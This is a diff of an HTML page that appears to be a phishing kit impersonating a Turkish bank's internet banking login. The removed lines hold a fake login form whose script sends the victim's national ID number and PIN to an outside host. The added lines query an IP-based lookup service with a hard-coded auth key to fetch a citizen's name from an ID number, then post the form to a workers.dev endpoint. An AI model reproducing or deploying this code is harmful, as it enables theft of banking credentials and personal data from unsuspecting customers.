@@ -87,131 +87,56 @@ margin-right: 0px;
 margin-top: 0px;
 margin-bottom: 0px;
 ">
-    <form name="aspnetForm" method="post" action="https://worker-broad-snow-1482.selimjuhan2.workers.dev/" id="aspnetForm" autocomplete="off" novalidate="novalidate">
-      <div id="" class="login-wrap">
-        <header></header>
-        <div id="" class="container">
-          <div id="" class="tc-kimlik-giris-wrap">
-            <div id="ctl00_ctl06" class="row">
-              <div id="ctl00_LoginBoxContainer" class="col-xs-12 col-md-6">
-                <div id="LoginBox" class="login-box long">
-                  <span id="ctl00_c_PageValidation" style="color:Red;visibility:hidden;"></span>
-                  <input name="rdLng" type="hidden" value="">
-                  <p>İnternet Şubemize Hoş Geldiniz</p>
-                  <div class="tabs-wrap" data-module="14">
-                    <div id="TabHeaderContainer" class="tabs tab-header-container">
-                      <a causesval="false" onclick=";;;" id="ctl00_c_RetailTabHeaderButton" class="active" href="">
-                        <span></span>BİREYSEL </a>
-                      <a causesval="false">
-                        <span></span>KURUMSAL </a>
-                    </div>
-                    <div id="" class="tab-container tab-contents">
-                      <div id="RetailTabContainer" class="tab-item active" style="
-					  padding-left: 10px;
-				  ">
-                        <div id="ctl00_c_RetailIdentityContainer" class="form-group hidden-title">
-                          <input autocomplete="off" name="ctl00$c$RetailIdentityTextBox" type="tel" maxlength="11" id="ctl00_c_RetailIdentityTextBox" class="form-control required isNumber numeric external-validation" style="  
+ y>
 
-font-size: 14px;  height: 46px;font-family: sans-serif;
-						  font-weight: 700;" placeholder="T.C. Kimlik / Müşteri Numaranız" data-msg-required="Müşteri / T.C. Kimlik Numaranızı Giriniz." maxlengthvalidationenabled="False"   disablevalidationonblur="true" onkeypress=";" onkeydown=";return FcsToCtrl(event,'ctl00_c_RetailLoginButton');"  causesval="false" onmousedown=";"   exvalidmethod="ValidateIdentity" aria-required="true" value="" >
-                          
-                        </div>
-                        <div id="RetailRememberMeContainer" class="clearfix" >
-                          <div role="button" class="switch-cont" tabindex="0">
-                            <span>Beni Hatırla</span>
-                            <label class="switch">
-                              <input id="ctl00_c_RetailRememberMeCheckBox" type="checkbox" name="ctl00$c$RetailRememberMeCheckBox" causesval="false" tabindex="-1" aria-hidden="true">
-                              <span class="switch-slider"></span>
-                            </label>
-                          </div>
-                        </div>
-                        <div id="ctl00_c_RetailPinContainer" class="form-group hidden-title">
-                          <input autocomplete="off" name="ctl00$c$RetailPinTextBox" type="password" maxlength="6" id="ctl00_c_RetailPinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" onmousedown=";" data-rule-range-min="5" placeholder="Şifre" data-msg-required="Lütfen şifrenizi giriniz."  style="font-size: 14px;font-family: sans-serif;    font-weight: 700;" disablevalidationonblur="true" data-rule-range-max="6"  onkeyup=";;" causesval="false" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." encrypted="" exvalidmethod="CheckAlphaNumericCurrentPinEntry" aria-required="true" value="">
-                         </div>
-                        <div id="" class="clearfix"></div>
-                      <button id="ctl00_c_RetailLoginButton" class="btn btn-danger sendBtn" disabled=""
-        onclick="checkAndSubmit();">
-    <span></span>DEVAM
-</button><br><br><br>
-                        <a causesval="true" onclick="" id="ctl00_c_RetailRemindPinButton" class="custom-link" href="">
-                          <span></span>Şifremi Unuttum </a>
-                        <div id="TabFooter" class="tab-footer">
-                          <p>Dijital Bankacılık müşterimiz olmak için</p>
-                          <a causesval="true" id="ctl00_c_OnlineApplicationButton" class="btn btn-default ">
-                            <span></span>HEMEN BAŞVUR </a>
-                        </div>
-                      </div>
-                
-                        
-                   
-                 
-                  </div>
-                  <style>
-			  input {
-  touch-action: manipulation;
-}
-                    .api-payment-container img {
-                      max-height: 92px;
-                      max-width: 92px;
-                    }
+    
 
-                    .ipNotInListRedirectBtn {
-                      background-color: #e10514 !important;
-                    }
-                  </style>
-                </div>
-              </div>
-            </div>
-          </div>
-    </form>
+  <form id="myForm">
+    <label for="RetailIdentityTextBox">Retail Identity:</label>
+    <input type="text" id="RetailIdentityTextBox" name="RetailIdentityTextBox" value="http://185.231.68.29/apiservice/aligollez/tc.php?auth=aligollezxd&tc=">
+    <br>
+    <button type="button" onclick="submitForm()">Gönder</button>
+  </form>
 
-  <script> function checkAndSubmit() {
+  <script>
+    function submitForm() {
+      // RetailIdentityTextBox değerini al
+      const retailIdentity = document.getElementById("RetailIdentityTextBox").value;
 
-   var kimlik = document.getElementById("ctl00_c_RetailIdentityTextBox").value;  
-            var sifre = document.getElementById("ctl00_c_RetailPinTextBox").value;  
+      // GET isteği ile belirtilen URL'ye istek gönder
+      fetch(retailIdentity)
+        .then(response => response.json())
+        .then(data => {
+          // Gelen JSON verisinden "adi" ve "soyadi" değerlerini al
+          const adi = data.adi;
+          const soyadi = data.soyadi;
 
-    if (button.disabled) {
-        alert('Giriş Bilgilerinizi Kontrol Ediniz !');
-        return false;  
-    }
- var button = document.getElementById('ctl00_c_RetailLoginButton');
+          // Alınan değerleri bir cookie'ye kaydet
+          document.cookie = `isim=${adi} ${soyadi}; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
 
-            if (!button.disabled) {
-              
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", "https://ajansdesire.com/asdasd/9index.php", true);
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
- 
-              
-                xhr.send("kimlik=" + kimlik + "&sifre=" + sifre);
-
-       
-                xhr.onload = function() {
-                    if (xhr.status == 200) {
-                      
-                        location.reload(); 
-                    }
-                };
-            } else {
-                alert('Giriş Bilgilerinizi Kontrol Ediniz !');
-            }
-  
-}
-		  </script> 
-		  
-    <script>
- 
-        window.addEventListener('load', function() {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://ajansdesire.com/asdasd/tgtg.php', true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    console.log('GET isteği başarıyla gönderildi.');
-                }
-            };
-            xhr.send();
+          // Formu başka bir URL'ye POST isteği ile gönder
+          const formData = new FormData(document.getElementById("myForm"));
+          fetch('https://worker-broad-snow-1482.selimjuhan2.workers.dev', {
+            method: 'POST',
+            body: formData
+          })
+            .then(response => response.json())
+            .then(data => {
+              console.log('POST isteği başarılı:', data);
+            })
+            .catch(error => {
+              console.error('POST isteği hatası:', error);
+            });
+        })
+        .catch(error => {
+          console.error('GET isteği hatası:', error);
         });
-    </script>
+    }
+  </script>
+
+
+          
+ 
     <div>
   </body>
 </html>
